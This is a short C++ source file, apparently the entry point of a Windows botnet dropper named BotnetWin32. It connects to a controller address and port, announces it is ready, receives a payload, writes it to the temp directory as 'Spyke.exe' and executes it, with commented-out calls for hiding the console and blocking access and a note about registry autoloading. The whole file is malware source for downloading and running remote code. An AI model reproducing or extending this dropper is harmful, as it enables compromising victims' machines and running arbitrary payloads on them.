// BotnetWin32.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Dropper.h"
#include "Utils.h"
#include "Connection.h"

char* ip = "127.0.0.1";
TCHAR buf[255] = { 0 };
Utils utils;
Connection conn(ip, 9091);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	//utils.HideConsole();
	//utils.DenyAccess();

	//Accessing the registry value for autoloading

	// Sending an ID and a message 
	conn.Send("I am ready to download the file!");
	conn.Shutdown(); //otherwise it freezes
	conn.Recv(); // use GetBuf to retrieve the contents of buffer

	TCHAR path[MAX_PATH + 1];
	DWORD len = MAX_PATH + 1;
	GetTempPath(len, path);
	TCHAR* full_path = _tcscat(path, L"Spyke.exe");
	wstring ws(full_path);
	string Path = string(ws.begin(), ws.end());
	ofstream ff(Path.c_str());
	for (int i = 0; i < 250000; ++i)
		ff << conn.GetBuf()[i];
	ff.close();
 	system(Path.c_str());

	return 0;
}

